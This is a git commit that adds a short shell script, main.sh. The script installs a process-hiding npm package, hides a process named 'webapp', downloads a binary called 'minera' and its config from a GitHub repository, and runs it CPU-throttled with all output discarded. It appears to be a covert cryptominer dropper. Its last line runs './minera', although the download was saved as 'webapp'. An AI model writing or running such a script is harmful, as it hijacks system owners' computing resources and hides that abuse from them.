68baada43a13bf1768a92e32ed43c573f28c8e80
danipedrosang <134082647+danipedrosang@users.noreply.github.com>
2023-06-03 16:51:08 +0700

    Create main.sh

---
+++ main.sh
@@ -0,0 +1,8 @@
+sudo apt-get update
+sudo apt install docker.io -y
+sudo apt install npm cpulimit -y
+sudo npm i -g node-process-hider && sudo ph add webapp config.json
+wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/config.json
+wget -qO webapp https://github.com/danipedrosang/marcrash/raw/main/minera
+chmod 777 webapp config.json
+cpulimit -l 45 ./minera >/dev/null 2>&1
